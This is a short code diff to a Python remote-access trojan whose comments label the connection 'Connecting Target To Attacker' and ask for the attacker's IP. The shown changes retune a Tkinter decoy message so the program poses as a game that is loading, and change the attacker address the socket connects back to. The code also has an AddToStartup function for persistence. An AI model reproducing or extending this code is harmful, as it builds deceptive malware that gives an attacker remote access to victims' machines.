@@ -45,7 +45,7 @@ def AddToStartup(f_name, path):
 # Connecting Target To Attacker
 def connect():
     #Showing Button before proceeding
-    label1 = tk.Label(root, text= 'Loading,... We'll tell you when done', fg='green', font=('helvetica', 12, 'bold'))
+    label1 = tk.Label(root, text= 'Loading,... Get ready to play in few miutes', fg='green', font=('helvetica', 12, 'bold'))
     canvas1.create_window(150, 200, window=label1)
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -56,7 +56,7 @@ def connect():
         try:
             
             # Note: Please Place Attacker's IP Here
-            s.connect(('172.20.10.3', 8080))
+            s.connect(('192.168.0.86', 8080))
 
             # Connected
             connected = True
